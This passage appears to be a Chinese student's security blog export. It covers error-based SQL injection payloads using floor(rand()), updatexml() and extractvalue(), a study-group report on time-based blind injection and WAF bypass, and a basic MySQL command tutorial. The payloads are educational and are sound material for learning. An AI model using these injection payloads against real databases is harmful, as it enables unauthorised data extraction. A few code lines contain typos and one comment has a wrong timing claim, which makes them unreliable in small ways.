<p>因为floor(rand(0)*2)这个东西用了随机函数，会随机产生0和1，所以每次执行结果是不确定的，那么在第一次查询动态表是否有这个数据的时候，得到的随机数0的确是可能是没有的，但是在下一步进行插入数据的时候，它又随机出来1，如果这个时候表里面是有随机数1的话，就会报错:’ Duplicate Entry’ 我们就可以在里面私藏返回我们想要的数据。比如上面的 select database() 。</p>
<p>但是注意的是，group_concat()会影响 group by 语句的执行</p>
<h3 id="updatexml-函数报错"><a href="#updatexml-函数报错" class="headerlink" title="updatexml()函数报错"></a>updatexml()函数报错</h3><p>updatexml()函数就更好用了，他就是利用格式错误，来返回我们想要的数据。其中，这个函数的参数传递为：updatexml(string,xml,string)，这里面的string可以瞎填，表示需要更新的内容，然后xml填写的是我们想要获得的信息，但是前面需要使用concat()函数加上字符 ‘<del>‘ ，在xml格式里面，是没有以 ‘</del>‘ 为开头的语句的。所以我们就构造了一个错误，并且这个’~’后面会报错返回我们想要的数据：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> updatexml(&quot;string&quot;,concat(<span class="string">&#x27;~&#x27;</span>,(<span class="keyword">select</span> database())),&quot;string&quot;);</span><br></pre></td></tr></table></figure>
<p>这样就返回了当前使用的数据库信息啦！</p>
<h3 id="extractvalue-函数报错"><a href="#extractvalue-函数报错" class="headerlink" title="extractvalue()函数报错"></a>extractvalue()函数报错</h3><p>这个函数使用方法和updatexml()是一样的，唯一不同的就是里面的参数就是extractvalue(“string”,xml)，所以在构造的时候，只要这样写就可以了：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> extractvalue(&quot;string&quot;,concat(<span class="string">&#x27;~&#x27;</span>,(<span class="keyword">select</span> database())));</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>信息安全</category>
      </categories>
      <tags>
        <tag>WriteUp</tag>
        <tag>SQL注入</tag>
      </tags>
  </entry>
  <entry>
    <title>Web小组报告（一）</title>
    <url>/2020/08/28/128f7edda942/</url>
    <content><![CDATA[<h1 id="搭建MySQL数据库："><a href="#搭建MySQL数据库：" class="headerlink" title="搭建MySQL数据库："></a>搭建MySQL数据库：</h1><ul>
<li>采用从官网下载的MySQL，一路点击 <code>Next</code> 之后成功在 <code>Win</code> 上面安装了 <code>MySQL</code> 数据库。</li>
</ul>
<p><img src="https://xorex.space/image/117.png" alt="image.png"></p>
<h1 id="问题报告"><a href="#问题报告" class="headerlink" title="问题报告"></a>问题报告</h1><h2 id="SQL语言相关："><a href="#SQL语言相关：" class="headerlink" title="SQL语言相关："></a>SQL语言相关：</h2><ol>
<li><strong>创建一个名为study的数据库的语句是？</strong></li>
</ol>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> DATABASE study;</span><br></pre></td></tr></table></figure>
<p><img src="https://xorex.space/image/118.png" alt="image.png"></p>
<ol start="2">
<li><strong>在study库里创建一个user表,包含三列:id(整数),name(长度为100的字符串)，sex(长度为1的字符串)</strong></li>
</ol>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">use study;</span><br><span class="line"><span class="keyword">set</span> names utf8;</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> <span class="keyword">user</span></span><br><span class="line">(ID <span class="type">INT</span>(<span class="number">4</span>),Name <span class="type">VARCHAR</span>(<span class="number">100</span>),Sex <span class="type">VARCHAR</span>(<span class="number">1</span>));</span><br></pre></td></tr></table></figure>
<p><img src="https://xorex.space/image/119.png" alt="image.png"></p>
<ol start="3">
<li>**往user表中插入以下数据: **</li>
</ol>
<ul>
<li> id=0,name=xiaoming,sex=y</li>
<li> id=1,name=xiaohong,sex=x</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> <span class="keyword">user</span></span><br><span class="line">(ID,Name,Sex)</span><br><span class="line"><span class="keyword">Values</span></span><br><span class="line">(<span class="number">0</span>,&quot;xiaoming&quot;,&quot;y&quot;),</span><br><span class="line">(<span class="number">1</span>,&quot;xiaohong&quot;,&quot;x&quot;);</span><br></pre></td></tr></table></figure>
<p><img src="https://xorex.space/image/120.png" alt="image.png"></p>
<ol start="4">
<li><strong>查询user表中所有数据的name列语句是?</strong></li>
</ol>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> name <span class="keyword">from</span> <span class="keyword">user</span>;</span><br></pre></td></tr></table></figure>
<p><img src="https://xorex.space/image/121.png" alt="image.png"></p>
<ol start="5">
<li><strong>查询user表中name为xiaoming的字段的语句是?</strong></li>
</ol>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="keyword">user</span></span><br><span class="line"><span class="keyword">where</span> name<span class="operator">=</span>&quot;xiaoming&quot;;</span><br></pre></td></tr></table></figure>
<p> <img src="https://xorex.space/image/122.png" alt="image.png"></p>
<ol start="6">
<li><strong>删除user表中sex为x的语句是?</strong></li>
</ol>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">delete</span> <span class="keyword">from</span> <span class="keyword">user</span></span><br><span class="line"><span class="keyword">where</span> sex<span class="operator">=</span><span class="string">&#x27;x&#x27;</span>;</span><br></pre></td></tr></table></figure>
<p><img src="https://xorex.space/image/123.png" alt="image.png"></p>
<ol start="7">
<li><strong>修改user表中id为0的数据,将其name值改为xiaobai的语句是?</strong></li>
</ol>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">update <span class="keyword">user</span></span><br><span class="line"><span class="keyword">set</span> name<span class="operator">=</span>&quot;xiaobai&quot;</span><br><span class="line"><span class="keyword">where</span> ID<span class="operator">=</span><span class="number">0</span>;</span><br></pre></td></tr></table></figure>
<p><img src="https://xorex.space/image/124.png" alt="image.png"></p>
<ol start="8">
<li><strong>了解mysql的函数,在mysql中user函数的作用是?</strong></li>
</ol>
<ul>
<li>MySQL函数是内置提供各种功能的方法，其中 <code>user()</code> 函数返回当前的用户名。</li>
</ul>
<p><img src="https://xorex.space/image/125.png" alt="image.png"></p>
<ol start="9">
<li><strong>sql中用于注释的单行与多行语句格式分别是?</strong></li>
</ol>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="keyword">user</span>; <span class="comment">-- 这个是单行注释!</span></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="keyword">user</span>; # 这个也是单行注释！</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="keyword">user</span>;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">这个</span></span><br><span class="line"><span class="comment">是多行</span></span><br><span class="line"><span class="comment">注释！</span></span><br><span class="line"><span class="comment">/*</span></span><br></pre></td></tr></table></figure>

<ol start="10">
<li><strong>了解mysql中的内联注释,它在安全方面的作用是?</strong></li>
</ol>
<ul>
<li>内联注释大概就是用来避开关键词黑名单，突破WAF来注入不被允许的SQL命令？可能是这样？<h2 id="MarkDown相关："><a href="#MarkDown相关：" class="headerlink" title="MarkDown相关："></a>MarkDown相关：</h2></li>
</ul>
<ol>
<li><p><strong>尝试使用md写一个表结构</strong></p>
<table>
<thead>
<tr>
<th>这是表头</th>
<th>这是表头</th>
</tr>
</thead>
<tbody><tr>
<td>这是内容</td>
<td>这是内容</td>
</tr>
<tr>
<td>这也是内容</td>
<td>这也是内容</td>
</tr>
</tbody></table>
</li>
<li><p><strong>提交的报告要简洁清晰，可用不同大小的标题进行分割</strong></p>
</li>
</ol>
<ul>
<li>有这样做的！</li>
</ul>
<ol start="3">
<li><strong>sql相关的截图一定要贴上</strong></li>
</ol>
<ul>
<li>已经全部贴过了。</li>
</ul>
<ol start="4">
<li><strong>写一些这几天对学习安全的感悟</strong></li>
</ol>
<ul>
<li>安全好有意思啊，我好菜啊！</li>
</ul>
<ol start="5">
<li><strong>有问题可以写在报告里，也可以查看其他同学的报告补充自己的知识</strong></li>
</ol>
<ul>
<li>大概只是学习了SQL的相关操作，对安全还是一无所知啊。</li>
</ul>
<h1 id="提升："><a href="#提升：" class="headerlink" title="提升："></a>提升：</h1><ol>
<li><strong>什么是information_schema数据库?这个数据库中TABLES,COLUMNS表中存放的是什么?</strong></li>
</ol>
<ul>
<li>这是一个不得了的数据库，里面存放着MySQL所在机器所维护的所有其他数据库的信息（元数据）。在这个数据库中 <code>TABLES</code> 存放着所有的表的相关信息。 <code>COLUMNS</code> 中存放着表中所有列的信息。</li>
</ul>
<p><img src="https://xorex.space/image/126.png" alt="image.png"></p>
<p><img src="https://xorex.space/image/127.png" alt="image.png"></p>
<ol start="2">
<li><strong>sql语言中IF语句的作用是? select if(1&gt;2,1,2);的结果是?思考一下if语句在sql注入的什么情形下会用到?假如无法使用if语句,你还能找到其他函数代替它吗?</strong></li>
</ol>
<ul>
<li>大概和 <code>C++</code> 的 <code>A?B:C</code>  的作用是一样的，判断 if 里面第一个参数的 bool 值，若为 true 则返回第二个表达式的值，若为 false 则返回第三个表达式的值。</li>
<li>因此 <code>select if(1&gt;2,1,2);</code> 的结果是 2 。</li>
<li>如果不能使用 if 语句，可以使用 case when then 或者 where 来代替 if 语句。</li>
</ul>
<ol start="3">
<li><strong>mysql中用于延迟的函数是?思考一下sleep函数在sql注入的什么情形下会用到?你还能找到其他函数代替该函数吗?</strong></li>
</ol>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">SLEEP(<span class="number">1</span>) <span class="comment">-- 令此语句执行时间长度为六秒钟</span></span><br></pre></td></tr></table></figure>
<ul>
<li> SLEEP 函数可以验证 SQL 注入攻击是否成功，让数据库执行固定时常的命令，然后读秒计算确定是否成功。代替的可以使用 BenchMark 函数来多次重复执行一条命令或者笛卡尔乘积来达成延的目的。</li>
</ul>
<h1 id="最后："><a href="#最后：" class="headerlink" title="最后："></a>最后：</h1><ul>
<li><strong>感谢三叶草的学长们为我们萌新准备了训练计划（真的是超级感谢啊！！！）</strong></li>
<li><strong>毕竟有人带领着学习效率会快很多，也能减少在误区里面浪费的时间。</strong></li>
<li><strong>对成信的期待值++，这里的技术氛围好棒啊！</strong></li>
<li><strong>对信息安全还是一头雾水，但是不得不说挺有意思的。</strong></li>
<li><strong>就这样了，再次感谢为我们操劳的学长们啦。</strong></li>
</ul>
]]></content>
      <categories>
        <category>信息安全</category>
      </categories>
      <tags>
        <tag>报告</tag>
      </tags>
  </entry>
  <entry>
    <title>MySQL命令学习</title>
    <url>/2020/08/27/94fe7c823089/</url>
    <content><![CDATA[<h2 id="《关于我高考分数太低不得不去转行搞信息安全这件事》"><a href="#《关于我高考分数太低不得不去转行搞信息安全这件事》" class="headerlink" title="《关于我高考分数太低不得不去转行搞信息安全这件事》"></a>《关于我高考分数太低不得不去转行搞信息安全这件事》</h2><ul>
<li>为什么随便什么事情加上书名号都能成为轻小说啊？？？</li>
</ul>
<p>emmmmm，最开始其实是有点遗憾的，因为我原本以为我可以稳的不能再稳地进入CUIT的软件工程专业的，毕竟我比去年的软工最低分数线高了5000名，比CUIT最低分数线高了12000名，这还录不上就过分了！结果就真的很过分了，河南省的117w考生中还真的出了4个头比我还铁的人，然后我就来了CUIT的信息安全专业。</p>
<p>但是俗话说既来之则安之，都是IT类的专业，只要自己好好学，就肯定有出路的。再说这些东西其实都是靠自学，只要自学能力够了，转什么方向都很轻松，抱着这样的想法，我就来到了CUIT。</p>
<p>然后在网上开始搜索各种关于CUIT信息安全的信息，因为当时在报考志愿的时候根本就没有考虑过CUIT的信息安全专业（我真的还是太自信了QAQ），然后在知乎中了解到了CUIT的三叶草社团非常非常厉害，还找到了三叶草的招新QQ群，于是我就加了进去。</p>
<p>里面的学长非常热情，其中有学长在群里面问有人想要学Web吗，我回了一句我想学，然后就收到了学长的QQ好友申请，然后他就推荐了我看图解HTTP和了解HTML相关的知识。几天过后，他有把我拉进了一个Web的学习小组，布置了第一次的任务，这也是这篇MySQL命令文章的来源。来吧少年，努力成为一名优秀的安全工程师吧！</p>
<h2 id="MySQL增加系列"><a href="#MySQL增加系列" class="headerlink" title="MySQL增加系列"></a>MySQL增加系列</h2><h3 id="CREATE"><a href="#CREATE" class="headerlink" title="CREATE:"></a>CREATE:</h3><ol>
<li><strong>create database</strong></li>
</ol>
<p>创造一个名字叫name的数据库：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">create</span> database &quot;name&quot;;</span><br></pre></td></tr></table></figure>
<ol start="2">
<li><strong>create table</strong></li>
</ol>
<p>创造一个名字叫name的表单：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> &quot;name&quot;</span><br><span class="line">(</span><br><span class="line">    column1 datatype1(size),</span><br><span class="line">    column2 datatype2(size),</span><br><span class="line">    column3 datatype3(size)</span><br><span class="line">);</span><br></pre></td></tr></table></figure>
<p>这里要注意的是如果不在想要加入表单的数据库中，可以在创建表单的同时，把表单直接加入想要加入的数据库中，具体的写法是把上面语句中的”name”代替为：database_name.table_name 这样就直接把表单加入到了指定的database_name里面了。</p>
<h3 id="SOURCE"><a href="#SOURCE" class="headerlink" title="SOURCE:"></a>SOURCE:</h3><p>在数据库中加入SQL表单，一般为后缀<code>.sql</code>的文件。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">source D:<span class="operator">/</span>downlaod<span class="operator">/</span>websites.sql;</span><br></pre></td></tr></table></figure>
<h3 id="USE："><a href="#USE：" class="headerlink" title="USE："></a><strong>USE</strong>：</h3><p>使用语句，用来选择数据库。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">use &quot;DATABASE&quot;; </span><br></pre></td></tr></table></figure>
<p> 使用名为DATABASE的数据库。</p>
<h3 id="SET："><a href="#SET：" class="headerlink" title="SET："></a><strong>SET</strong>：</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">set</span> &quot;column&quot; utf8; </span><br></pre></td></tr></table></figure>
<p>将列column使用utf8编码 （防乱码）</p>
<h3 id="DROP"><a href="#DROP" class="headerlink" title="DROP:"></a>DROP:</h3><ol>
<li>drop table 语句 删除表</li>
</ol>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">drop</span> <span class="keyword">table</span> &quot;table_name&quot;;</span><br></pre></td></tr></table></figure>


<ol>
<li>drop database 语句 删除数据库</li>
</ol>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">drop</span> database &quot;database_name&quot;;</span><br></pre></td></tr></table></figure>


<h3 id="Truncate："><a href="#Truncate：" class="headerlink" title="Truncate："></a>Truncate：</h3><p>用来删除一个表的数据，但是不删除这个表。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">truncate</span> <span class="keyword">table</span> &quot;table_name&quot;;</span><br></pre></td></tr></table></figure>


<h2 id="SQL查看系列"><a href="#SQL查看系列" class="headerlink" title="SQL查看系列"></a>SQL查看系列</h2><h3 id="VERSION"><a href="#VERSION" class="headerlink" title="VERSION:"></a>VERSION:</h3><p>用来返回数据库的版本信息。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> version();</span><br></pre></td></tr></table></figure>
<h3 id="SHOW："><a href="#SHOW：" class="headerlink" title="SHOW："></a>SHOW：</h3><p>用来显示所有的数据库或者表。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">show</span> databases;</span><br><span class="line"><span class="keyword">show</span> tablse;</span><br></pre></td></tr></table></figure>
<h3 id="SELECT："><a href="#SELECT：" class="headerlink" title="SELECT："></a><strong>SELECT</strong>：</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> &quot;*/column&quot;  <span class="keyword">from</span> &quot;table&quot;; </span><br></pre></td></tr></table></figure>
<p>显示table表里面的所有列或者column列。</p>
<h3 id="DATABASE"><a href="#DATABASE" class="headerlink" title="DATABASE()"></a>DATABASE()</h3><p>配合着select食用，用来返回当前使用的数据库名字。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> database();</span><br></pre></td></tr></table></figure>
<h3 id="DISTINCT："><a href="#DISTINCT：" class="headerlink" title="DISTINCT："></a><strong>DISTINCT</strong>：</h3><p>distinct 不同，相异。</p>
<p>显示table表里的所有<strong>不重复</strong>的column列，加在column名称之前。（用于数据的去重）</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">distinct</span> &quot;column&quot; <span class="keyword">from</span> &quot;table&quot;;</span><br></pre></td></tr></table></figure>
<h3 id="WHERE："><a href="#WHERE：" class="headerlink" title="WHERE："></a><strong>WHERE</strong>：</h3><p>条件语句，显示出当column列里值等于0的数据，用于数据的过滤。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> &quot;table&quot; <span class="keyword">where</span> &quot;column=0&quot;;</span><br></pre></td></tr></table></figure>
<h3 id="LIMIT-："><a href="#LIMIT-：" class="headerlink" title="LIMIT ："></a><strong>LIMIT</strong> ：</h3><p>只显示出来column!=0的时候，前2行的数据。等价于[1,2]的数据。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> &quot;table&quot; <span class="keyword">where</span> &quot;column!=0&quot;</span><br><span class="line">limit <span class="number">2</span>;</span><br></pre></td></tr></table></figure>
<p>只显示出来column!=0的时候，第2行之后的2行数据，即第3，4行数据。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> &quot;table&quot; <span class="keyword">where</span> &quot;column!=0&quot;</span><br><span class="line">limit <span class="number">2</span>,<span class="number">2</span>;</span><br></pre></td></tr></table></figure>
<p>只显示出来column!=0的时候，第2行之后所有的数据。等价于[3,last]的数据。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> &quot;table&quot; <span class="keyword">where</span> &quot;column!=0&quot;</span><br><span class="line">limit <span class="number">2</span>,<span class="number">-1</span>;</span><br></pre></td></tr></table></figure>
<h3 id="AND-amp-OR："><a href="#AND-amp-OR：" class="headerlink" title="AND&amp;OR："></a>AND&amp;OR：</h3><p>主要运用在判断语句里面，作为增加判断复杂度的语句：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> &quot;table&quot; </span><br><span class="line"><span class="keyword">where</span> &quot;column!=0&quot; <span class="keyword">or</span> &quot;column!=1&quot;</span><br></pre></td></tr></table></figure>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> &quot;table&quot;</span><br><span class="line"><span class="keyword">where</span> &quot;column1!=1&quot; <span class="keyword">and</span> &quot;column2!=2&quot;</span><br></pre></td></tr></table></figure>
<p>上面就等同于if里面的&amp;&amp;和||啦。</p>
<h3 id="ORDER-BY："><a href="#ORDER-BY：" class="headerlink" title="ORDER BY："></a>ORDER BY：</h3><p>排序语句，将要显示的数据按照自己要求的规则进行排序。</p>
<p>将table表里的数据，按照column列值进行排序，ASC为从小到大，DESC为从大到小，如果不写排序方式，则默认为ASC，从小到大。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> &quot;table&quot;</span><br><span class="line"><span class="keyword">order</span> <span class="keyword">by</span> <span class="keyword">column</span> <span class="keyword">ASC</span><span class="operator">/</span><span class="keyword">DESC</span>;</span><br></pre></td></tr></table></figure>
<p>ASC全称<strong>ascend</strong> ，为升序的意思，即从小到大。</p>
<p>DESC全程<strong>descend</strong>，为降序的意思，即从大到小。</p>
<h3 id="GROUP-BY："><a href="#GROUP-BY：" class="headerlink" title="GROUP BY："></a>GROUP BY：</h3><p>group by 语句用于结合聚合函数，根据一个或多个列对结果集进行分组。我们需要选择一个column列作为分组的依据，然后这个column中数值相同的数据将会被整合到一行数据中，被整合在一起的数据需要进行合并处理，不然就会报错。</p>
<p>也就是说，在SELECT语句中出现的元素要么为一个聚合函数的输入值，要么为GROUP BY语句的参数。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> column1, aggregate_function(column2)</span><br><span class="line"><span class="keyword">from</span> &quot;table&quot;</span><br><span class="line"><span class="keyword">where</span> column1<span class="operator">&lt;=</span><span class="number">10</span></span><br><span class="line"><span class="keyword">group</span> <span class="keyword">by</span> column1;</span><br><span class="line"><span class="keyword">having</span> column2<span class="operator">&lt;=</span><span class="number">10</span>;</span><br></pre></td></tr></table></figure>
<p>这样，会返回一个列出所有不同column1的值为一行数据的表格，其中column1值相同的数据所拥有的column2的值会根据aggregate_function()的功能进行计算，然后出现在那行数据里。</p>
<p><strong>HAVING</strong>语句！</p>
<p>需要注意的是，这里where语句是没有办法将aggregate_function()返回的参数进行筛选的，因为在执行where的时候，聚合函数还没有工作，所以筛选只能使用在  group by 语句后面的having语句，通常来说having语句都处于命令的最后。</p>
<p>having其实是可以代替where来使用的，它甚至可以使用where不能使用的别名，比如 column1+column2 as column3 ，那么having就可以使用column3来筛选，但是where不行，where只能只用column1+column2。</p>
<p>但是有一点限制的是，对于select没有选中的数据，having是不能拿来用的，比如在语句 select column1,column2 from “table”; 中，后面的 having 语句就只能使用column1和column2来筛选数据，但是where可以使用没有被选中的column3来使用数据。</p>
<h3 id="LIKE："><a href="#LIKE：" class="headerlink" title="LIKE："></a>LIKE：</h3><p>用于在where里面模糊匹配：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> &quot;table&quot;</span><br><span class="line"><span class="keyword">where</span> <span class="keyword">column</span> <span class="keyword">like</span> &quot;%KeyWord%&quot;;</span><br></pre></td></tr></table></figure>
<p>%这个符号非常有灵性，%在哪一边，哪一边就可以模糊处理，什么字符都可以，这个like简直就是搜索利器啊。直接搜搜column列里面的数据有没有和KeyWord相匹配的。</p>
<p>同时Like语句 支持 or/and/ 逻辑哦！具体用法如下：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> &quot;table&quot;</span><br><span class="line"><span class="keyword">where</span> column1 <span class="keyword">like</span> &quot;%KeyWord1%&quot; </span><br><span class="line"><span class="keyword">or</span> column1 <span class="keyword">like</span> &quot;%KeyWord2%&quot;;</span><br></pre></td></tr></table></figure>
<p>Like除了可以用%来模糊任意个字符，还可以用 _ 下划线，来之模糊下划线部位的字符。</p>
<h3 id="IN："><a href="#IN：" class="headerlink" title="IN："></a>IN：</h3><p>where会用到，等价于 =</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> &quot;table&quot;</span><br><span class="line"><span class="keyword">where</span> <span class="keyword">column</span> <span class="keyword">in</span> (value1,value2,value3)；</span><br></pre></td></tr></table></figure>
<p>下面是等价的写法：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> &quot;table&quot;</span><br><span class="line"><span class="keyword">where</span> <span class="keyword">column</span><span class="operator">=</span>value1 <span class="keyword">or</span> <span class="keyword">column</span><span class="operator">=</span>value2 <span class="keyword">or</span> <span class="keyword">column</span><span class="operator">=</span>value3;</span><br></pre></td></tr></table></figure>
<h3 id="UNION："><a href="#UNION：" class="headerlink" title="UNION："></a>UNION：</h3><p>Union用于合并两个select所选中数据的值，必须是两个表，并去重，如果不想去重，就使用UNION ALL 语句；</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> column1 <span class="keyword">from</span> &quot;table1&quot;</span><br><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> column2 <span class="keyword">from</span> &quot;table2&quot;; </span><br></pre></td></tr></table></figure>
<p>这样就可以把table1和table2两个表中的column1列和column2列的数据进行合并，然后去重之后返回，大概就和并集概念是一样的，但是要注意这两个列中的数据类型必须相似，比如都是字符串连个列都应该是字符串，如果是整形，两个列都应该是整形。</p>
<h3 id="BETWEEN："><a href="#BETWEEN：" class="headerlink" title="BETWEEN："></a>BETWEEN：</h3><p>between A and B 是用来来选取A到B范围内的元素，注意这个区间在不同的数据库中的开闭情况是不同的，在MySQL中，这个是两边都闭的区间。</p>
<p>这条语句可以用在任何数据类型上面，如果所作用的数据是字符串，那么它筛选的区间是根据字符串的<strong>首字母</strong>进行筛选的。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> &quot;table&quot;</span><br><span class="line"><span class="keyword">where</span> <span class="keyword">column</span> <span class="keyword">between</span> <span class="string">&#x27;A&#x27;</span> <span class="keyword">and</span> <span class="string">&#x27;B&#x27;</span>;</span><br></pre></td></tr></table></figure>
<p>这个东西还能用来筛选日期，只要日期格式规范就行。</p>
<h3 id="AS："><a href="#AS：" class="headerlink" title="AS："></a>AS：</h3><p>as是SQL语句中的别名，用来给原来的列或者由于运算新产生的列一个新的名字。</p>
<p>比如把两个列相加产生的新数据重新命名为sum：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> column1<span class="operator">+</span>column2 <span class="keyword">as</span> sum <span class="keyword">from</span> &quot;table&quot;;</span><br></pre></td></tr></table></figure>
<p>在比如把合并的几个字符串产生的新字符串命名为add:</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> comcat(column1,column2) <span class="keyword">as</span> <span class="keyword">add</span> <span class="keyword">from</span> &quot;table&quot;;</span><br></pre></td></tr></table></figure>
<h2 id="SQL修改系列"><a href="#SQL修改系列" class="headerlink" title="SQL修改系列"></a>SQL修改系列</h2><h3 id="INSERT-INTO："><a href="#INSERT-INTO：" class="headerlink" title="INSERT INTO："></a>INSERT INTO：</h3><p>插入信息，insert into。</p>
<ol>
<li>普通导入：第一行表名后面写列名，第二行Values后面写数据，注意如果要用单引号全用单引号，如果要用双引号全用双引号，需要保持一致性。</li>
</ol>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> &quot;table&quot; (column1,column2,column3)</span><br><span class="line"><span class="keyword">values</span> (&quot;value1&quot;,&quot;values2&quot;,&quot;value3&quot;);</span><br></pre></td></tr></table></figure>
<ol start="2">
<li>批量导入：和上面一样，不过写多个括号，用逗号隔开。</li>
</ol>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> &quot;table&quot; (column1,column2,column3)</span><br><span class="line"><span class="keyword">values</span> (&quot;values1&quot;,&quot;values2&quot;,&quot;values3&quot;),(&quot;values1&quot;,&quot;values2&quot;,&quot;values3&quot;),</span><br><span class="line">(&quot;values1&quot;,&quot;values2&quot;,&quot;values3&quot;),</span><br><span class="line">(&quot;values1&quot;,&quot;values2&quot;,&quot;values3&quot;);</span><br></pre></td></tr></table></figure>
<h3 id="UPDATE："><a href="#UPDATE：" class="headerlink" title="UPDATE："></a>UPDATE：</h3><p>用于更新表中已经存在的数据：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">update &quot;table&quot;</span><br><span class="line"><span class="keyword">set</span> column1<span class="operator">=</span>value1,column2<span class="operator">=</span>value2</span><br><span class="line"><span class="keyword">where</span> column0<span class="operator">=</span>value0;</span><br></pre></td></tr></table></figure>
<p>当利用column0的值等于value0，来确定我们需要跟新的行，然后对这一行的column1和column2进行更新。</p>
<p><strong>注意</strong> where语句的存在非常重要，如果没有where，那么将会把表中的所有数据都更改，而不是指定数据。</p>
<h3 id="DELETE："><a href="#DELETE：" class="headerlink" title="DELETE："></a>DELETE：</h3><p>用于删除表中的行：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">delete</span> <span class="keyword">from</span> &quot;table&quot;</span><br><span class="line"><span class="keyword">where</span> <span class="keyword">column</span><span class="operator">=</span><span class="keyword">value</span>;</span><br></pre></td></tr></table></figure>
<p>和上面的update一样，一定要注意where语句的存在，不然会把所有的行全部删掉，也就是删掉了整个表。注意Delete语句不支持单独删除某行某列的数据，只能删除整行数据。</p>
<h3 id="JOIN"><a href="#JOIN" class="headerlink" title="JOIN:"></a>JOIN:</h3><p>连接函数，所谓连接函数，就是将两个不同表的数据连接在一起，输出一个新的表，这个表是两个表合并的结果，注意如果需要使用JOIN，尽可能让两个表的数据类型是一样的，这样可以很好的保证数据合并之后的效果。</p>
<p>join的连接，需要一个桥梁，也就是两个表中，有一列的数据类型是相同的，我们就能通过column1的值和column2的值相同的两个表的数据合并成一行。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">table1 <span class="keyword">join</span> table2 <span class="keyword">on</span> table1.column1 <span class="operator">=</span> table2.column2;</span><br></pre></td></tr></table></figure>
<p>下面的图真的就是JOIN的全部精髓了：</p>
<p><img src="https://xorex.space/image/116.png"></p>
